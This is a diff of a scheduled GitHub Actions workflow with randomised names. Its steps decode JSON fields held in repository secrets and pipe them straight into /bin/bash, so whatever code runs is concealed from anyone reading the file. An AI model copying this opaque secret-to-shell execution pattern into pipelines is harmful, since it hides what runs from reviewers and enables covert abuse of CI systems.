@@ -1,26 +1,32 @@
 name: baixiaochi1974
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '46 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baixiaochi1974
         env:
-          s0: ${{ secrets.s0 }}
+          jcq01: ${{ secrets.jcq01 }}
         run: |
-          echo $s0 | jq -r .j635 | /bin/bash
-          echo $ogr30 | jq -r .psjj3 | /bin/bash
-          echo $vdfh30753 | jq -r .qylck49441 | /bin/bash
-          echo $rfpau1 | jq -r .odhxt031 | /bin/bash
-          echo $j826 | jq -r .bxob3 | /bin/bash
-          echo $byv53 | jq -r .uzrb28748 | /bin/bash
-          echo $ht96 | jq -r .vr38027 | /bin/bash
-          echo $jg3 | jq -r .ln2 | /bin/bash
-          echo $k5978 | jq -r .jm015 | /bin/bash
-          echo $ndox6023 | jq -r .fufkm56 | /bin/bash
+          echo $jcq01 | jq -r .anxq673 | /bin/bash
+          echo $dvw12006 | jq -r .fm81 | /bin/bash
+          echo $mnp337 | jq -r .jaltt1612 | /bin/bash
+          echo $mcdb45974 | jq -r .kmxv9 | /bin/bash
+          echo $clgn4919 | jq -r .kigff454 | /bin/bash
+          echo $gimdm7 | jq -r .nhklw58251 | /bin/bash
+          echo $rz131 | jq -r .lytl5 | /bin/bash
+          echo $m1305 | jq -r .gp93402 | /bin/bash
+          echo $dx206 | jq -r .zss484 | /bin/bash
+          echo $put94200 | jq -r .xlbs7 | /bin/bash
+          echo $fictw72 | jq -r .pnzrw2646 | /bin/bash
+          echo $zk1686 | jq -r .cw754 | /bin/bash
+          echo $vt27495 | jq -r .zozhq289 | /bin/bash
+          echo $liqs083 | jq -r .b71336 | /bin/bash
+          echo $swo2 | jq -r .uezq2805 | /bin/bash
 
